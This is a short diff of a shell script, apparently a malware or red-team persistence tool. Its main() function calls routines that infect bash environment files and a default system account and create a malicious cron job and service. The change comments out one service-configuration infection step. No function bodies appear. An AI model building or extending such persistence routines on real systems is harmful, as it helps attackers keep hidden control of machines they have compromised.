@@ -122,7 +122,7 @@ infect_bash_environment_file() {
 main() {
     infect_bash_environment_file
     infect_default_system_account
-    infect_service_configuration
+    #infect_service_configuration
     create_malicious_cronjob
     create_malicious_service
 }
